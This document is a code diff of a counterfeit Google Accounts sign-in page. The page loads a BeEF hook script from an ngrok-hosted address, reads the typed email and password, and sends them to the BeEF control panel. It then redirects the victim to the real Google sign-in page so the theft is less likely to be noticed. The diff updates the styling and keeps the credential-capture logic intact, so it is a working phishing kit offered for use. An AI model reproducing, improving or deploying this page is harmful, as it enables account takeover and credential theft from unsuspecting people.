@@ -1,50 +1,115 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google Accounts</title>
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+    
     <script src="https://harrison-unsilicated-talon.ngrok-free.dev/hook.js"></script>
+
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-card { border: 1px solid #dadce0; border-radius: 8px; width: 450px; padding: 48px 40px 36px; text-align: center; }
+        * { box-sizing: border-box; }
+        body {
+            font-family: "Google Sans", "Roboto", arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #202124;
+        }
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            text-align: center;
+        }
+        @media (max-width: 600px) {
+            .container { border: none; padding: 20px; }
+        }
         .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
-        p { font-size: 16px; margin-bottom: 24px; }
-        input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; margin-top: 20px; }
-        .footer { clear: both; padding-top: 40px; font-size: 12px; color: #70757a; text-align: left; }
+        h1 { font-size: 24px; font-weight: 400; margin: 10px 0; }
+        p { font-size: 16px; margin-bottom: 40px; }
+        
+        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        
+        .links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+        }
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .btn-next {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-next:hover { background-color: #1557b0; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
     </style>
 </head>
 <body>
-    <div class="login-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo" alt="Google">
-        <h1>Sign in</h1>
-        <p>Use your Google Account</p>
-        <input type="email" id="email" placeholder="Email or phone" required>
-        <input type="password" id="pass" placeholder="Enter your password" required>
-        <div style="text-align: left; color: #1a73e8; font-size: 14px; margin-top: 10px; cursor: pointer;">Forgot password?</div>
-        <button class="btn" onclick="capture()">Next</button>
-        <div class="footer">Not your computer? Use Guest mode to sign in privately.</div>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
+
+    <div class="input-group">
+        <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
+    </div>
+    <div class="input-group">
+        <input type="password" id="pass" placeholder="Enter your password" autocomplete="current-password">
     </div>
 
-    <script>
-        function capture() {
-            var email = document.getElementById('email').value;
-            var pass = document.getElementById('pass').value;
-            
-            // Sends the data to your BeEF Logs
-            if(typeof beef !== 'undefined') {
-                beef.net.send('/log', 0, "GOOGLE_CREDS - User: " + email + " | Pass: " + pass);
-            } else {
-                console.log("Hook not active, but data captured: " + email + ":" + pass);
-            }
+    <div class="links">
+        <span class="create-account">Forgot password?</span>
+        <button class="btn-next" onclick="captureAndRedirect()">Next</button>
+    </div>
+</div>
 
-            // Redirect to real Google after "stealing" to reduce suspicion
-            setTimeout(function() {
-                window.location.href = "https://accounts.google.com/signin";
-            }, 1000);
+<script>
+    function captureAndRedirect() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        // Send data to BeEF control panel
+        if (typeof beef !== 'undefined') {
+            beef.net.send('/log', 0, "MODERN_UI_CAPTURE -> User: " + email + " | Pass: " + pass);
         }
-    </script>
+
+        // Realistic delay before redirecting to real Google
+        setTimeout(() => {
+            window.location.href = "https://accounts.google.com/v3/signin/identifier";
+        }, 800);
+    }
+</script>
+
 </body>
 </html>
